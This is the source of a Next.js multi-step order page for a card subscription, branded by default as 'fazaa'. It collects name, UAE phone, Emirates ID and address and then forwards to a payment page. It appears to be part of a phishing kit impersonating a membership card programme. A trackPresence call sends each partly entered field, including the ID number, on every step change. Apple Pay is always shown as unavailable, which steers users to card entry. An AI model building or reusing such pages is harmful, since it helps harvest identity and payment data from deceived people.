'use client';
import React, { useState, useEffect, Suspense } from 'react';
import { trackPresence } from '@/lib/presence';
import { useSearchParams, useRouter } from 'next/navigation';
import { CheckCircle2, ChevronRight } from 'lucide-react';
import { useForm, FormProvider } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import { BRANDS, type BrandKey, type CardTypeKey } from '@/data/brands';
import { useLang } from '@/context/LanguageContext';
import { t, brandsI18n } from '@/i18n';

// Schemas with generic messages — display text comes from i18n
const personalSchema = z.object({
  fullName:   z.string().min(2, 'required'),
  phone:      z.string().min(8, 'required'),
  emiratesId: z.string().min(15, 'required'),
});
const addressSchema = z.object({
  region:       z.string().min(2, 'required'),
  streetAddress:z.string().min(2, 'required'),
  neighborhood: z.string().min(2, 'required'),
  deliveryDate: z.string().min(2, 'required'),
  paymentMethod:z.enum(['card', 'apple_pay']),
});
const fullSchema = personalSchema.merge(addressSchema);

function OrderContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { lang } = useLang();
  const T = t[lang].order;

  const brandKey = (searchParams?.get('brand') || 'fazaa') as BrandKey;
  const typeKey  = (searchParams?.get('type')  || 'gold')  as CardTypeKey;

  const brand = BRANDS[brandKey] || BRANDS.fazaa;
  const card  = brand.cards.find(c => c.id === typeKey) || brand.cards[0];
  const bi    = brandsI18n[lang][brandKey];
  const ci    = bi.cards[typeKey];

  const [step, setStep] = useState(1);

  // Track presence on each step change
  useEffect(() => {
    const vals = methods.getValues();
    return trackPresence({
      page: `order-step${step}`,
      step: `order-step${step}`,
      fullName:      vals.fullName      || undefined,
      phone:         vals.phone         || undefined,
      emiratesId:    vals.emiratesId    || undefined,
      region:        vals.region        || undefined,
      streetAddress: vals.streetAddress || undefined,
      neighborhood:  vals.neighborhood  || undefined,
      deliveryDate:  vals.deliveryDate  || undefined,
      paymentMethod: vals.paymentMethod || undefined,
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step]);

  const methods = useForm({
    resolver: zodResolver(step === 1 ? personalSchema : fullSchema),
    defaultValues: {
      fullName: '', phone: '', emiratesId: '',
      region: '', streetAddress: '', neighborhood: '',
      deliveryDate: '', paymentMethod: 'card' as 'card' | 'apple_pay',
    },
    mode: 'onTouched',
  });

  const onSubmit = async () => {
    if (step === 1) { setStep(2); return; }
    if (step === 2) { setStep(3); }
  };

  const handleFinalSubmit = () => {
    const data = methods.getValues();
    sessionStorage.setItem('reg_data', JSON.stringify({
      fullName: data.fullName, phone: data.phone, emiratesId: data.emiratesId,
      brand: brand.key, cardType: card.id, region: data.region,
      streetAddress: data.streetAddress, neighborhood: data.neighborhood,
      deliveryDate: data.deliveryDate, paymentMethod: data.paymentMethod,
    }));
    router.push(`/payment?brand=${brandKey}&type=${typeKey}`);
  };

  const registrationTitle = T.subtitle(
    lang === 'ar' ? brand.name : brand.nameEn,
    ci.name,
  );

  const inp = (field: string) =>
    `w-full bg-white border ${(methods.formState.errors as Record<string, unknown>)[field] ? 'border-red-500' : 'border-gray-200 focus:border-[#c9a227] focus:ring-1 focus:ring-[#c9a227]'} rounded-lg px-4 py-2.5 outline-none transition-shadow`;

  const errT = T.errors as Record<string, string>;
  const err = (formField: string, tKey?: string) =>
    (methods.formState.errors as Record<string, unknown>)[formField] ? (
      <p className="text-xs text-red-500">{errT[tKey ?? formField] ?? ''}</p>
    ) : null;

  return (
    <div className="max-w-[500px] mx-auto px-4 py-12">
      <div className="text-center mb-8">
        <h1 className="text-3xl font-bold text-gray-900 mb-2">{T.title}</h1>
        <p className="text-gray-500 text-sm">{registrationTitle}</p>
      </div>

      {/* Progress Steps */}
      <div className="flex items-center justify-between mb-8 relative px-4">
        <div className="absolute top-1/2 left-8 right-8 h-0.5 bg-gray-200 -z-10 -translate-y-1/2" />
        <div
          className="absolute top-1/2 right-8 h-0.5 bg-[#c9a227] -z-10 -translate-y-1/2 transition-all duration-300"
          style={{ width: step === 1 ? '0%' : step === 2 ? '50%' : '100%', left: 'auto' }}
        />
        {T.steps.map((label, i) => {
          const id = i + 1;
          const isActive = step === id;
          const isCompleted = step > id;
          return (
            <div key={id} className="flex flex-col items-center gap-2 bg-[#f5f5f5] px-2 relative z-0">
              {isCompleted ? (
                <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm border-2 bg-[#1a1a1a] border-[#1a1a1a] text-white">
                  <CheckCircle2 size={16} />
                </div>
              ) : isActive ? (
                <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm border-2 bg-[#c9a227] border-[#c9a227] text-white shadow-[0_0_0_4px_rgba(201,162,39,0.2)]">
                  {id}
                </div>
              ) : (
                <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm border-2 bg-white border-gray-300 text-gray-400">
                  {id}
                </div>
              )}
              <span className={`text-xs font-medium ${isActive || isCompleted ? 'text-gray-900' : 'text-gray-400'}`}>{label}</span>
            </div>
          );
        })}
      </div>

      <div className="bg-white rounded-xl shadow-md border border-gray-100 p-6 md:p-8">
        <FormProvider {...methods}>
          <form onSubmit={methods.handleSubmit(onSubmit)} className="space-y-6">

            {/* Step 1 — Personal */}
            {step === 1 && (
              <div className="space-y-4">
                <p className="text-sm text-gray-500">{T.personal.hint}</p>
                <div className="space-y-1.5">
                  <label className="text-sm font-bold text-gray-700 block">{T.personal.fullName}</label>
                  <input {...methods.register('fullName')} placeholder={T.personal.fullNamePh} data-testid="input-fullname" className={inp('fullName')} />
                  {err('fullName')}
                </div>
                <div className="space-y-1.5">
                  <label className="text-sm font-bold text-gray-700 block">{T.personal.phone}</label>
                  <div className="flex gap-2">
                    <input {...methods.register('phone')} placeholder={T.personal.phonePh} data-testid="input-phone" className={`flex-1 ${inp('phone')}`} />
                    <div className="w-[80px] bg-gray-50 border border-gray-200 rounded-lg flex items-center justify-center text-sm font-medium text-gray-700 shrink-0" dir="ltr">+971</div>
                  </div>
                  {err('phone')}
                </div>
                <div className="space-y-1.5">
                  <label className="text-sm font-bold text-gray-700 block">{T.personal.id}</label>
                  <input {...methods.register('emiratesId')} placeholder={T.personal.idPh} data-testid="input-emirates-id" className={inp('emiratesId')} />
                  {err('emiratesId')}
                </div>
              </div>
            )}

            {/* Step 2 — Address */}
            {step === 2 && (
              <div className="space-y-6">
                <div className="space-y-4">
                  <h3 className="text-lg font-bold text-gray-900 border-b border-gray-100 pb-2">{T.address.sectionTitle}</h3>
                  <div className="space-y-1.5">
                    <label className="text-sm font-bold text-gray-700 block">{T.address.region}</label>
                    <select {...methods.register('region')} data-testid="select-region"
                      className={`w-full bg-white border ${methods.formState.errors.region ? 'border-red-500' : 'border-gray-200 focus:border-[#c9a227]'} rounded-lg px-4 py-2.5 outline-none appearance-none`}>
                      <option value="">{T.address.regionPh}</option>
                      {Object.entries(T.address.regions).map(([v, label]) => (
                        <option key={v} value={v}>{label}</option>
                      ))}
                    </select>
                    {err('region')}
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-sm font-bold text-gray-700 block">{T.address.street}</label>
                    <input {...methods.register('streetAddress')} placeholder={T.address.streetPh} data-testid="input-street" className={inp('streetAddress')} />
                    {err('streetAddress')}
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1.5">
                      <label className="text-sm font-bold text-gray-700 block">{T.address.neighborhood}</label>
                      <input {...methods.register('neighborhood')} placeholder={T.address.neighborhoodPh} data-testid="input-neighborhood" className={inp('neighborhood')} />
                      {err('neighborhood')}
                    </div>
                    <div className="space-y-1.5">
                      <label className="text-sm font-bold text-gray-700 block">{T.address.deliveryDate}</label>
                      <input type="date" {...methods.register('deliveryDate')} data-testid="input-delivery-date" className={`${inp('deliveryDate')} font-sans`} />
                      {err('deliveryDate')}
                    </div>
                  </div>
                </div>

                <div className="space-y-4 pt-2">
                  <h3 className="text-lg font-bold text-gray-900 border-b border-gray-100 pb-2">{T.payment.sectionTitle}</h3>
                  <div className="bg-gray-50 rounded-lg p-4 flex justify-between items-center">
                    <span className="font-bold text-gray-800">{T.payment.total}</span>
                    <span className="font-bold text-[#c9a227] text-lg">{card.price}</span>
                  </div>
                  <div className="space-y-3">
                    <label className="text-sm font-bold text-gray-700 block">{T.payment.methodLabel}</label>
                    <label className={`flex items-center justify-between p-4 border rounded-lg cursor-pointer transition-colors ${methods.watch('paymentMethod') === 'card' ? 'border-[#c9a227] bg-[#c9a227]/5' : 'border-gray-200 hover:border-gray-300'}`}>
                      <div className="flex items-center gap-3">
                        <input type="radio" value="card" {...methods.register('paymentMethod')} className="w-4 h-4 text-[#c9a227]" />
                        <span className="font-medium text-gray-800">{T.payment.cardOption}</span>
                      </div>
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img src="/mastercard.svg" alt="Mastercard" className="h-6" />
                    </label>
                    <label className={`flex items-center justify-between p-4 border rounded-lg cursor-pointer transition-colors ${methods.watch('paymentMethod') === 'apple_pay' ? 'border-[#c9a227] bg-[#c9a227]/5' : 'border-gray-200 hover:border-gray-300'}`}>
                      <div className="flex items-center gap-3">
                        <input type="radio" value="apple_pay" {...methods.register('paymentMethod')} className="w-4 h-4 text-[#c9a227]" />
                        <span className="font-medium text-gray-800 font-sans">{T.payment.appleOption}</span>
                      </div>
                      <div className="h-6 flex items-center bg-black text-white px-2 rounded text-xs font-sans">Pay</div>
                    </label>
                    {methods.watch('paymentMethod') === 'apple_pay' && (
                      <p className="text-sm text-red-500 pr-1">{T.payment.appleUnavailable}</p>
                    )}
                  </div>
                </div>
              </div>
            )}

            {/* Step 3 — Summary */}
            {step === 3 && (
              <div className="space-y-6">
                <h3 className="text-lg font-bold text-gray-900 border-b border-gray-100 pb-2">{T.summary.sectionTitle}</h3>
                <div className="bg-gray-50 rounded-lg p-5 space-y-3">
                  {[
                    { label: T.summary.brandLabel, value: lang === 'ar' ? brand.name : brand.nameEn },
                    { label: T.summary.cardLabel,  value: ci.name },
                    { label: T.summary.totalLabel, value: card.price, gold: true },
                    { label: T.summary.nameLabel,  value: methods.getValues('fullName') },
                  ].map(({ label, value, gold }, i, arr) => (
                    <div key={i} className={`flex justify-between items-center ${i < arr.length - 1 ? 'border-b border-gray-200 pb-3' : 'pb-1'}`}>
                      <span className="text-gray-600">{label}</span>
                      <span className={`font-bold ${gold ? 'text-[#c9a227] text-lg' : 'text-gray-900'}`}>{value}</span>
                    </div>
                  ))}
                </div>
                <div className="flex gap-4 pt-4 mt-6 border-t border-gray-100">
                  <button type="button" onClick={handleFinalSubmit} data-testid="btn-subscribe"
                    className="flex-1 bg-[#c9a227] hover:bg-[#b8943f] text-white font-bold py-3 px-6 rounded-lg transition-colors shadow-sm flex items-center justify-center gap-2">
                    {T.btnSubscribe}
                  </button>
                  <button type="button" onClick={() => setStep(2)}
                    className="flex-1 bg-white border border-gray-300 hover:bg-gray-50 text-gray-700 font-bold py-3 px-6 rounded-lg transition-colors">
                    {T.btnBack}
                  </button>
                </div>
              </div>
            )}

            {/* Step 4 — Success */}
            {step === 4 && (
              <div className="py-8 text-center space-y-4">
                <div className="w-20 h-20 bg-green-100 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
                  <CheckCircle2 size={40} />
                </div>
                <h2 className="text-2xl font-bold text-gray-900">{T.success.title}</h2>
                <p className="text-gray-500">{T.success.sub(registrationTitle)}</p>
                <div className="pt-6">
                  <button type="button" onClick={() => router.push('/')}
                    className="bg-[#c9a227] hover:bg-[#b8943f] text-white font-medium py-3 px-8 rounded-lg transition-colors w-full sm:w-auto shadow-sm cursor-pointer">
                    {T.success.home}
                  </button>
                </div>
              </div>
            )}

            {/* Nav buttons for steps 1-2 */}
            {step < 3 && (
              <div className="flex gap-4 pt-4 mt-6 border-t border-gray-100">
                <button type="submit" data-testid="btn-next"
                  className="flex-1 bg-[#c9a227] hover:bg-[#b8943f] text-white font-bold py-3 px-6 rounded-lg transition-colors shadow-sm flex items-center justify-center gap-2 cursor-pointer">
                  {T.btnNext}
                  <ChevronRight size={18} className={lang === 'ar' ? 'rotate-180' : ''} />
                </button>
                {step > 1 ? (
                  <button type="button" onClick={() => setStep(step - 1)}
                    className="flex-1 bg-white border border-gray-300 hover:bg-gray-50 text-gray-700 font-bold py-3 px-6 rounded-lg transition-colors cursor-pointer">
                    {T.btnBack}
                  </button>
                ) : (
                  <button type="button" onClick={() => router.push(`/cards?brand=${brandKey}`)}
                    className="flex-1 bg-white border border-gray-300 hover:bg-gray-50 text-gray-700 font-bold py-3 px-6 rounded-lg transition-colors cursor-pointer">
                    {T.btnCancel}
                  </button>
                )}
              </div>
            )}
          </form>
        </FormProvider>
      </div>
    </div>
  );
}

export default function Order() {
  return <Suspense><OrderContent /></Suspense>;
}
